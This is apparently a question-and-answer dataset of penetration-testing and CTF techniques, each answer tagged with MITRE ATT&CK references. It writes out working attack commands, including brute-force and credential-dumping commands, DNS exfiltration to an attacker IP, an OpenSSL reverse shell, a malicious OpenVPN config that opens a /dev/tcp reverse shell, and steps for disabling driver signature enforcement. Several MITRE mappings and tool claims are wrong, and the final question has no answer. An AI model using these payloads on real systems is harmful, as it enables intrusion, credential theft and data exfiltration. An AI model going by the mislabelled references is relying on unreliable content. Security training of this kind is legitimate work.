A: If a system is found to have a tmux session running as the root user, you can connect to it using the command 'tmux -S /.devs/dev_sess' to gain full root privileges on the system. Tmux is a terminal multiplexer that allows multiple terminal sessions to be managed from a single window, and a misconfigured tmux session running as root can be abused to escalate privileges. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: How can we use Hydra to perform a dictionary attack against an SSH service?
A: To perform a dictionary attack against an SSH service using Hydra, you can run the following command: `hydra -l george -P /path/to/rockyou.txt ssh://192.168.50.201:2222`. This will attempt to log in as the user 'george' using the passwords in the rockyou.txt wordlist against the SSH service running on 192.168.50.201 port 2222. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: What are the steps to extract a password manager's database and crack the master password?
A: 1. Locate the password manager database file on the target system, in this case a .kdbx file for KeePass.
2. Transfer the database file to your attack machine.
3. Use a tool like keepass2john to format the database hash for Hashcat.
4. Determine the correct Hashcat mode for the password hash.
5. Prepare a wordlist and rule set to crack the password.
6. Use Hashcat to attempt to crack the master password. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Managers, and MITRE Tactics are: CredentialAccess.

## Q: What information is needed to effectively launch a dictionary attack against a web service's login page?
A: To effectively launch a dictionary attack against a web service's login page, you need to gather two key pieces of information: 1) The POST data that contains the username and password fields, which can be obtained by intercepting a login attempt with a tool like Burp, and 2) A failed login indicator, such as a specific error message that appears on the page after an unsuccessful login attempt. This allows you to differentiate between successful and failed logins during the attack. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: What are some ways to obtain an NTLM hash for use in pass-the-hash attacks?
A: NTLM hashes can be obtained using tools like Mimikatz. The commands 'privilege::debug', 'token::elevate', and 'lsadump::sam' can be used to extract NTLM hashes from the Security Accounts Manager (SAM) database on the target system. The extracted Administrator NTLM hash can then be used in pass-the-hash attacks. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can an NTLM hash be used to gain access to a restricted SMB share?
A: The smbclient tool can be used to authenticate to an SMB share using an NTLM hash instead of a plaintext password. The command requires the path to the share, the username (e.g., Administrator), and the --pw-nt-hash argument to specify the NTLM hash. This allows access to the SMB share without needing to crack the password. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: TA0008, Lateral Movement.

## Q: How can an attacker use the Net-NTLMv2 protocol to gain unauthorized access?
A: An attacker can set up a malicious SMB server using the Responder tool to capture Net-NTLMv2 hashes from a target system. Once the hash is captured, it can be cracked using tools like Hashcat to obtain the plaintext password. The attacker can then use the compromised credentials to access other systems or resources on the network. MITRE References: MITRE ID is T1187, MITRE Name is: Forced Authentication, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you use a directory traversal vulnerability to retrieve a user's SSH private key?
A: If you gain access to a web application via a directory traversal vulnerability, you may be able to read files on the system, including a user's SSH private key. However, you would then need to crack the passphrase on the private key to be able to use it to connect to the target system. This can be done by transforming the private key into a hash format, creating a wordlist and rule set, and using a tool like John the Ripper to crack the passphrase. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Tool Transfer, and MITRE Tactics are: Lateral Movement.

## Q: What steps can you take to crack the passphrase of an SSH private key?
A: To crack the passphrase of an SSH private key, you can follow this methodology: 1) Transform the private key into a hash format using a tool like ssh2john. 2) Determine the correct Hashcat mode for the hash. 3) Create a rule file with password complexity requirements. 4) Prepare a wordlist based on any password information you've gathered. 5) Use a cracking tool like Hashcat or John the Ripper with the hash, wordlist, and rules to attempt to crack the passphrase. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What tool can be used to generate the malicious serialized payload for the NodeJS deserialization vulnerability?
A: ysoserial is a tool that can be used to generate malicious serialized payloads for a variety of deserialization vulnerabilities, including those in NodeJS applications. ysoserial supports multiple payload types and can be used to create payloads that execute arbitrary commands. To use ysoserial, you would run a command like: `java -jar ysoserial.jar NodeJSEcho '[COMMAND]' | base64` to generate a base64-encoded payload that can be injected into the vulnerable application. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you create a malicious OpenOffice macro to gain an initial foothold on a target system?
A: To create a malicious OpenOffice macro, you can use the Metasploit module 'exploit/multi/misc/openoffice_document_macro'. This will generate a malicious OpenOffice document with a default PowerShell payload. However, since the target system has PowerShell Constrained Language Mode enabled, the default payload will not work. Instead, you will need to modify the macro to use a different technique, such as Invoke-WebRequest to download and execute a malicious binary. This binary can be created using a tool like Shellter to evade detection by antivirus. After modifying the macro, you can rename the file with a .zip extension, extract the contents, and update the 'Basic/Standard/Module1.xml' file with the new payload. Finally, re-zip the contents and send the malicious document to the target. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: Execution.

## Q: How can you leverage Docker group membership to escalate privileges on a system?
A: If the current user is a member of the Docker group, they can leverage this to mount the host filesystem in a Docker container and execute commands as root. This can be done by running 'docker images --all' to list the available Docker images, and then using the 'olympia' image to gain root access. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: TA0004.

## Q: What are some notable RPC interfaces that can be used for enumeration and exploitation?
A: Notable RPC interfaces include:
- IFID: 12345778-1234-abcd-ef00-0123456789ab, Named Pipe: \pipe\lsarpc, Description: LSA interface, used to enumerate users.
- IFID: 3919286a-b10c-11d0-9ba8-00c04fd92ef5, Named Pipe: \pipe\lsarpc, Description: LSA Directory Services (DS) interface, used to enumerate domains and trust relationships.
- IFID: 12345778-1234-abcd-ef00-0123456789ac, Named Pipe: \pipe\samr, Description: LSA SAMR interface, used to access public SAM database elements (e.g., usernames) and brute-force user passwords regardless of account lockout policy.
- IFID: 1ff70682-0a51-30e8-076d-740be8cee98b, Named Pipe: \pipe\atsvc, Description: Task scheduler, used to remotely execute commands.
- IFID: 338cd001-2244-31f1-aaaa-900038001003, Named Pipe: \pipe\winreg, Description: Remote registry service, used to access and modify the system registry.
- IFID: 367abb81-9844-35f1-ad32-98f038001003, Named Pipe: \pipe\svcctl, Description: Service control manager and server services, used to remotely start and stop services and execute commands.
- IFID: 4b324fc8-1670-01d3-1278-5a47bf6ee188, Named Pipe: \pipe\srvsvc, Description: Service control manager and server services, used to remotely start and stop services and execute commands.
- IFID: 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57, Named Pipe: \pipe\epmapper, Description: DCOM interface, used for brute-force password grinding and information gathering via WM. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: SMB/Windows Admin Shares, and MITRE Tactics are: Lateral Movement.

## Q: How can you execute remote code on a machine using valid credentials?
A: It is possible to execute remote code on a machine if the credentials of a valid user are available, using the dcomexec.py script from the Impacket framework. Remember to try with the different objects available, such as ShellWindows, ShellBrowserWindow, and MMC20. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: SMB/Windows Admin Shares, and MITRE Tactics are: Lateral Movement.

## Q: How can you leverage the Sudo NOPASSWD configuration to gain elevated privileges on a Linux system?
A: If the Sudo configuration on a Linux system has the NOPASSWD option set, it allows users to run specific commands with root privileges without needing to enter a password. You can check the Sudo configuration using "sudo -l" and then leverage this to run commands like wget to download and execute a malicious payload to gain a root shell. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What tools and techniques can be used to crack password hashes on a Linux system?
A: One common technique is to use password cracking tools like John the Ripper to brute force password hashes. If you have access to password hash files like /etc/shadow, you can copy them to your attacking machine, use John the Ripper with a wordlist like rockyou.txt to crack the hashes, and then use the recovered passwords to gain access to accounts. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What techniques were used to bypass the AppLocker policy and execute PowerShell?
A: The PowerShell binary was blocked by AppLocker policy, so other native PowerShell executables and DLLs were used to instantiate a PowerShell session, such as C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe and C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Defense Evasion.

## Q: What technique was used to recover the password for the 'root.exe' binary?
A: The 'root.exe' binary and 'check.dll' were downloaded and analyzed in IDA Pro. It was discovered that the string 'Fm`fEhOl}h' was XOR'd with the value 9. GCHQ CyberChef's XOR Brute Force tool was used to recover the password 'OdioLaFeta'. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can we exploit a Remote File Inclusion (RFI) vulnerability in a WordPress plugin?
A: We can exploit the RFI vulnerability in the Gwolle Guestbook plugin by sending an HTTP GET request to the "ajaxresponse.php" script with a crafted "abspath" parameter. The exploit URL would be "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.10", which would allow us to execute arbitrary code on the target system. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can we achieve privilege escalation on a Linux system by exploiting the Tar command?
A: We can exploit the Tar command to achieve privilege escalation by abusing wildcards and checkpoint actions. The command "tar --checkpoint=1 --checkpoint-action=exec=/bin/bash" can be used to execute a malicious payload when the Tar command is run by a privileged user, such as the "onuma" user in this case. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can we replace a scheduled backup file with a malicious version to gain root access on the target system?
A: We can replace the temporary backup file created by the "backuperer" service with a malicious version containing a setuid binary. By monitoring the "backuperer.service" using "watch -n 1 'systemctl list-timers'", we can identify the window of opportunity to replace the backup file before it is extracted. We can then create a 32-bit setuid binary and a tar archive, transfer them to the target system, and overwrite the temporary backup file to have the malicious payload extracted and executed with root privileges. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: What are some common techniques for privilege escalation on Windows systems?
A: Common Windows privilege escalation techniques include exploiting known vulnerabilities such as MS14-058, MS14-070, and MS15-051. The Metasploit module "local_exploit_suggester" can be used to identify applicable exploits for the target system. Migrating to a process running under NT AUTHORITY\NETWORK SERVICE, such as davcdata.exe, can also help obtain a stable root shell. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can we bypass ASLR (Address Space Layout Randomization) protections when developing a buffer overflow exploit?
A: To bypass ASLR when developing a buffer overflow exploit, you can try the following techniques:

1. Find a non-ASLR module within the vulnerable application that contains a suitable JMP ESP instruction. This allows you to use a reliable return address without being affected by ASLR.

2. Leverage information leaks or other vulnerabilities that may allow you to obtain the runtime address of a specific module or function, which can then be used as the return address. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can Python pickle vulnerabilities be exploited to achieve remote code execution on a target system?
A: Python pickle is a serialization format that can be used to store and transmit Python objects. If an application deserializes untrusted pickle data, it can lead to remote code execution. To exploit this, you can create a malicious Python object, serialize it to a byte string, and pass it to the vulnerable application. When the application deserializes the data, it will execute the malicious code. Tools like Pypykatz (version 2.3.8) can be used to generate and execute these payloads. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you identify missing security patches on a Windows server and use them to escalate privileges?
A: To identify missing security patches on a Windows server, you can use the "multi/recon/local_exploit_suggester" module in Metasploit. This module will scan the target system and suggest relevant kernel exploits based on the Windows version and installed updates. After gaining initial access, you can run this module to find potential privilege escalation vulnerabilities. Two successful exploits were identified in the challenge, demonstrating the importance of keeping systems up-to-date with the latest security patches. MITRE References: MITRE ID is T1068, MITRE Name is: Exploit Software, and MITRE Tactics are: Privilege Escalation.

## Q: What are some techniques for conducting a client-side attack to bypass the perimeter in a CTF challenge?
A: To conduct a client-side attack, you can leverage vulnerabilities in client-side applications like web browsers or document viewers. One example is CVE-2017-0199, which is a vulnerability in Microsoft Office that can be exploited using a malicious RTF document to execute arbitrary code. Tools like the CVE-2017-0199 Toolkit by @bhdresh can be used to create the malicious RTF document and generate an HTA payload. The Empire post-exploitation framework can then be used to receive the callback from the malicious payload. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: Execution.

## Q: How can you use a Python script to brute force Tomcat credentials?
A: The script 'tomcat-brute.py' (shown in Appendix A) can be used to brute force Tomcat credentials. It opens a list of common Tomcat credentials and attempts to login to the '/manager/html' page on the target. If valid credentials are found, they are printed to the console. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you create a malicious WAR file to deploy on a vulnerable Tomcat server?
A: The 'make-war.sh' script (shown in Appendix B) can be used to create a malicious WAR file to deploy on a vulnerable Tomcat server. It downloads a JSP file browser webshell, packages it into a WAR file, and the WAR file can then be deployed to the Tomcat server's web application manager. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you upgrade a webshell to a SILENTTRINITY agent on a compromised Tomcat server?
A: After deploying the malicious WAR file and obtaining a webshell, the webshell can be upgraded to a SILENTTRINITY agent. SILENTTRINITY is a post-exploitation framework that can be installed by cloning the GitHub repository, installing Python dependencies, and configuring the SILENTTRINITY server. The WMIC stager can then be generated and executed on the target to establish a SILENTTRINITY connection. MITRE References: MITRE ID is T1064, MITRE Name is: Scripting, and MITRE Tactics are: Execution.

## Q: How can privilege escalation be achieved by abusing command-line history?
A: When conducting privilege escalation, it's important to check the .bash_history file in case credentials have been passed over the command-line. This can sometimes reveal passwords or other sensitive information that can be used to gain elevated access. For example, in the given scenario, the .bash_history file contained the password 'lokipasswordmischieftrickery' which allowed the attacker to successfully su to the 'loki' user account and then escalate to root. Checking command-line history is a simple but often overlooked technique in privilege escalation. MITRE References: MITRE ID is T1552, MITRE Name is: Unsanitized User Inputs, and MITRE Tactics are: Privilege Escalation.

## Q: What are some common techniques used by penetration testers to breach a perimeter through exposed network services?
A: Penetration testers often leverage password attacks such as basic dictionary attacks, rule-based attacks, and cracking techniques to breach a perimeter. These attacks can target network services like SSH, KeePass password managers, and NTLM/Net-NTLMv2 hashes to gain access to systems. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can penetration testers use NTLM and Net-NTLMv2 hashes to gain access to other systems?
A: Penetration testers can crack NTLM and Net-NTLMv2 hashes and then use them to gain access to other systems through techniques like pass the hash or NTLM relay attacks. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can you exploit a Drupal 7 site to achieve remote code execution (RCE) as an unauthenticated user?
A: To exploit a Drupal 7 site for unauthenticated remote code execution:1. Check the Drupal CHANGELOG.txt to see if the site is vulnerable to critical RCE vulnerabilities like Drupalgeddon 2 (CVE-2018-7600) or Drupalgeddon 3 (CVE-2018-7602). 2. If the site is vulnerable, you can use tools like Droopescan to enumerate installed modules and themes, which may have additional vulnerabilities.3. Enable the "PHP filter" module in the Drupal admin panel, which allows executing PHP code.4. Create a webshell script, add it as Drupal content, and execute it to get remote code execution as the web server user.This exploit chain takes advantage of the PHP filter module combined with Drupal's lack of input sanitization to achieve unauthenticated RCE. The specific version and patch level of Drupal determine the exact vulnerability that can be used. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can you use the H2 Database Console to achieve remote code execution on a server?
A: To achieve RCE via the H2 Database Console:1. Identify that the H2 database is running and accessible (e.g. on port 8082). 2. Use the "CREATE ALIAS" function in H2 to call Java code and execute system commands.3. Create a reverse shell script (e.g. in Python) and execute it through the H2 console to get a remote shell.The key is that the H2 database is running as root, so any code executed through the console will run with elevated privileges. This technique was demonstrated by Matheus Bernandes and can be automated using scripts like the one provided by h4ckNinja.Note that this exploit requires access to the H2 console, which may be restricted to localhost by default. You'll need to establish an SSH tunnel or other method to access the console remotely. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access, Privilege Escalation, Execution.

## Q: What techniques can be used to exploit a misconfigured Node-RED instance for remote code execution?
A: To exploit a misconfigured Node-RED instance for remote code execution, you can use the following techniques:

1. Drag the "tcp" input node to the canvas and configure it to connect to your attacking host.
2. Connect the "tcp" input node to an "exec" node, which will allow you to execute OS commands.
3. Connect the "exec" node to a "tcp" output node configured to "Reply to TCP".
4. Click "Deploy" to execute the malicious flow and receive a reverse shell. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you leverage a misconfigured Redis instance for lateral movement and privilege escalation?
A: To leverage a misconfigured Redis instance for lateral movement and privilege escalation, you can:

1. Identify the Redis instance by scanning the network for port 6379.
2. Use Redis's ability to write files to the filesystem to create a web shell.
3. Upgrade the web shell to a reverse shell.
4. Leverage the permissions of the www-data user to gain access to other systems via Docker network. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Lateral Movement, Privilege Escalation.

## Q: What technique can be used to exploit a cron job for privilege escalation?
A: To exploit a cron job for privilege escalation, you can use rsync wildcard abuse. Specifically:

1. Create a file with a malicious payload (e.g., a setuid binary) and name it with a special character like '-e'.
2. Place the file in a directory owned by a low-privileged user that is backed up by the root-owned cron job.
3. The cron job will execute the malicious file, allowing you to gain root privileges. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Privilege Escalation.

## Q: How can the restricted shell (rbash) be escaped on the target system?
A: The restricted shell (rbash) can be escaped by using the SSH '-t' switch to force a tty, which will bypass the restrictions of rbash. Additionally, the PATH environment variable can be set to include the necessary directories for command execution after escaping the restricted shell. MITRE References: MITRE ID is T1088, MITRE Name is: Bypass User Account Control, and MITRE Tactics are: TA0004.

## Q: Explain how Linux Capabilities can be used to escalate privileges on the target system?
A: Linux Capabilities allow specific privileges to be granted to a binary, bypassing the normal permission checks. The 'getcap' utility can be used to enumerate the capabilities assigned to binaries on the system. In this case, the 'logMonitor-0.1' and '/usr/bin/tac' binaries have been assigned the 'cap_dac_read_search+ei' capability, which allows them to bypass permissions checks when reading or searching directories. This can be exploited to read the root SSH key and gain elevated access. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: TA0004.

## Q: How can you bypass Driver Signature Enforcement (DSE) to load your own kernel driver on Windows?
A: To bypass Driver Signature Enforcement (DSE) and load your own unsigned kernel driver on Windows, you can use the following steps:1. Enable the 'Test Signing' boot configuration option, which allows loading of test-signed drivers. This can be done by running the following command in an elevated PowerShell prompt:```powershellbcdedit.exe /set testsigning on```2. Reboot the system for the changes to take effect. You will see a 'Test Mode' watermark on the desktop after rebooting.3. You can now create a service for your unsigned kernel driver (e.g. 'evil.sys') using the `sc.exe` command, but you won't be able to start it due to the DSE check:```powershellsc.exe create evilDriver type= kernel binPath= C:\evil.syssc.exe start evilDriver```4. To bypass the DSE check, you can use a tool like 'gCli.exe' that leverages vulnerabilities in a legitimate signed driver (e.g. 'gdrv.sys') to temporarily disable driver signing enforcement and start the unsigned driver.The 'gCli.exe' tool can be used with the following commands:- `-d`: Disable driver signing enforcement- `-e`: Re-enable driver signing enforcement- `-l`: List relevant addresses for the attackMITRE ATT&CK:- ID: T1553.006- Name: Modify Authentication Process- Tactics: Defense Evasion MITRE References: MITRE ID is T1553.006, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion.

## Q: What vulnerabilities can be used to bypass the driver signing enforcement policy on Windows?
A: The driver 'gdrv.sys' has two known vulnerabilities (CVE-2018-19320 and CVE-2018-19321) that can be used to bypass the driver signing enforcement policy on Windows:1. These vulnerabilities provide arbitrary memory read/write from userland to kernel memory.2. During runtime, the driver enforcement policy is located in memory at the address `CI!g_CiOptions` (where 'CI' is the 'Code Integrity Module' DLL, `C:\Windows\System32\ci.dll`).3. By using the arbitrary write primitive in kernel memory, you can overwrite the policy value to bypass the signing enforcement.4. The 'gCli.exe' tool provides a convenient way to leverage these vulnerabilities. It can disable the driver signing enforcement, start the unsigned driver, and then re-enable the enforcement.MITRE ATT&CK:- ID: T1068- Name: Exploitation for Privilege Escalation- Tactics: Privilege Escalation MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you download an exploit from the Exploit Database?
A: The 'D' field on the Exploit Database homepage provides a quick way to download the exploit file. You can click on this field to initiate the download of the respective exploit. MITRE References: MITRE ID is T1193, MITRE Name is: Spearphishing Attachment, and MITRE Tactics are: Initial Access.

## Q: How can we execute the exploit for qdPM 9.1 against the target?
A: To execute the exploit, we first need to copy the exploit to our current working directory using `searchsploit`. Then, we can execute the exploit against the target path using the found login credentials. The exploit arguments can be determined by reading the source code and the usage section of the script. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can we verify that the exploit was successful and that we have command execution on the target?
A: After executing the exploit, we can use `curl` to verify that the PHP script was executed by the `www-data` system account. This indicates that the exploit was successful and we have command execution on the target. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can the Windows Subsystem for Linux (WSL) be used to obtain administrative credentials on a compromised Windows system?
A: If WSL is installed on the compromised system, the attacker can enumerate the Linux filesystem and check the .bash_history file, which may contain administrative credentials. The attacker can also use the bash shell within WSL to further explore the Linux environment and potentially escalate privileges. MITRE References: MITRE ID is T1564, MITRE Name is: Hide Artifacts, and MITRE Tactics are: TA0005.

## Q: How can you bruteforce the TNS Listener to establish communication?
A: Sometimes it may be necessary to bruteforce the TNS Listener to establish communication. You can use tools like `odat` (Oracle Database Attacking Tool) to perform this task. MITRE References: MITRE ID is T1110.003, MITRE Name is: Brute Force: Password Spraying, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can SNMP enumeration be used to find sensitive information on a target system?
A: SNMP enumeration can be used to find sensitive information on a target system by querying the Management Information Base (MIB) to retrieve details about the device. This can include information such as the device serial number, running services, network configurations, and potentially credentials. Tools like snmpwalk can be used to query the SNMP service and extract this information. Version 2 of SNMP should be used if possible, as the default public community string may grant read access to sensitive data. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can a user enumerate stored credentials on a Windows system that may lead to privilege escalation?
A: The 'cmdkey /list' command can be used to display stored user names and passwords or credentials on a Windows system. This may reveal credentials for privileged accounts that can be used to escalate privileges. For example, if a 'runas /savecred' shortcut is discovered, the stored credentials can be used to execute commands as an administrator. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can a user extract and decrypt Windows Data Protection API (DPAPI) credentials and masterkeys to access saved credentials?
A: Users can locate the credential files and masterkey files stored in the Windows user profile directories using the 'dir /S /AS' command. The files can be downloaded, base64 encoded, and transferred to an attacker-controlled system. The mimikatz tool can then be used to decrypt the DPAPI-protected credential and masterkey data to recover the plaintext credentials. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can DNS be used to exfiltrate information from a system?
A: DNS can be used to exfiltrate information from a system by making DNS queries that include the requested data in the hostname. For example, the following command can be used to exfiltrate the operating system via DNS:

127.0.0.1 & nslookup -querytype=A "%OS%.a.a" 10.10.14.2

This queries the DNS server at 10.10.14.2 with a hostname that includes the value of the %OS% environment variable. The DNS response can then be captured and parsed on the attacker's system to retrieve the exfiltrated data. MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: TA0010.

## Q: How can OpenSSL be used to obtain a reverse shell on Windows?
A: OpenSSL can be used to obtain a reverse shell on Windows using the following technique:

1. Generate a self-signed SSL certificate using OpenSSL:

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

2. Start two OpenSSL s_server instances to listen for the reverse shell:

openssl s_server -quiet -key key.pem -cert cert.pem -port 73
openssl s_server -quiet -key key.pem -cert cert.pem -port 136

3. Initiate the reverse shell using the following command:

127.0.0.1 & START "" cmd /c "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.2:136"

This command establishes a reverse shell to the attacker's machine on ports 73 and 136 using the OpenSSL s_client command. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0002.

## Q: How can you leverage the PlaySMS vulnerability (CVE-2018-19213) to achieve remote code execution in a CTF challenge?
A: To exploit the PlaySMS vulnerability (CVE-2018-19213) to achieve remote code execution in a CTF challenge, follow these steps:

1. Identify the existence of a PlaySMS installation on the target system, such as by fuzzing the web directory.
2. Attempt to log in to the PlaySMS admin panel with default or weak credentials.
3. Craft a malicious CSV file with PHP code in the first field.
4. Upload the malicious CSV file to the PlaySMS 'Bulk Import' functionality to execute the PHP code and gain remote code execution. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What Zabbix API information can be enumerated to gain remote code execution?
A: The Zabbix API can be enumerated to retrieve information such as host IDs, usernames, and authentication tokens. With this information, the Zabbix RCE exploit (CVE-N/A) by Alexander Gurin can be used to achieve remote code execution. The exploit is designed for Zabbix versions 2.2 to 3.0.3. It leverages the Zabbix API to execute arbitrary commands on the Zabbix server. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can the Zabbix agent be abused to pivot and gain further access on the target system?
A: The Zabbix agent can be abused to execute system commands on remote hosts, as it provides the "system.run" functionality. By using this, an attacker can execute commands on the Zabbix agent host, potentially leading to further access. For example, an attacker can execute a reverse shell command to gain interactive access on the host. However, the default timeout for Zabbix agent tasks is 3 seconds, so the attacker must use techniques to bypass this limitation, such as piping the reverse shell into a waiting listener. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you leverage a user's password found in a text file to gain access to a system as a different user?
A: If you find a user's password in a text file, you should try using that password to authenticate as that user or other users on the system. Techniques like Runas, WinRM, RDP, or scheduling a task can be used to execute commands as the target user, depending on their group memberships and permissions. The goal is to continuously reevaluate the access you have gained and follow any new attack vectors that become available. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Initial Access.

## Q: How can a malicious DLL be created and deployed to perform privilege escalation via DLL hijacking?
A: To perform privilege escalation via DLL hijacking, you can create a malicious DLL that contains code to execute when the DLL is loaded. This can be done by creating a DLL with a DllMain function that contains your malicious payload, such as creating a new administrative user. The malicious DLL can then be placed in a directory that is searched by the DLL loading mechanism before the legitimate DLL, causing the malicious DLL to be loaded instead. By having the malicious DLL executed in the context of a service running with higher privileges, you can escalate your own privileges on the system. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005, Privilege Escalation.

## Q: How can you use JAWS and Seatbelt to enumerate Windows systems if automated tools like winPEAS are blocked by antivirus solutions?
A: If automated tools like winPEAS are blocked by antivirus solutions, you can use alternative tools such as JAWS and Seatbelt for Windows enumeration. JAWS (Just Another Windows (Enum) Script) is a PowerShell script that can be used to enumerate a wide range of information about a Windows system. Seatbelt is a C# project that allows you to quickly enumerate a variety of security-related information. These tools can be used as alternatives to winPEAS when antivirus solutions block its execution, or you can combine their use with manual enumeration techniques to ensure you don't miss any important findings. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Defense Evasion.

## Q: How can PowerUp be used to exploit unquoted service paths on Windows?
A: PowerUp can be used to automatically find and abuse unquoted service paths. The Get-UnquotedService command identifies vulnerable services, and the Write-ServiceBinary function can place a malicious executable in the vulnerable path to escalate privileges. MITRE References: MITRE ID is T1546.015, MITRE Name is: Services - Unquoted Service Path Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use the SeImpersonatePrivilege to perform privilege escalation?
A: Users with the SeImpersonatePrivilege can leverage this privilege to impersonate the security context of another user account, allowing them to perform operations with the permissions of that higher-privileged account. This can be done by coercing a privileged process, such as an IIS web server running as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity, to connect to a controlled named pipe. The user can then impersonate the security context of the privileged process and execute commands or obtain an interactive shell with the permissions of the higher-privileged account. MITRE References: MITRE ID is T1134.002, MITRE Name is: Access Token Manipulation: Create Process with Token, and MITRE Tactics are: Privilege Escalation.

## Q: How can you create a malicious OpenVPN configuration file to gain a reverse shell?
A: To create a malicious OpenVPN configuration file, you can include a script that will execute a reverse shell when the configuration file is loaded. An example payload would be:

remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
nobind
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/1337 0>&1 2>&1&'"

This will execute a Bash reverse shell back to the attacker's machine when the OpenVPN configuration is loaded. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you use ncat to bypass firewall restrictions and access a remote service?
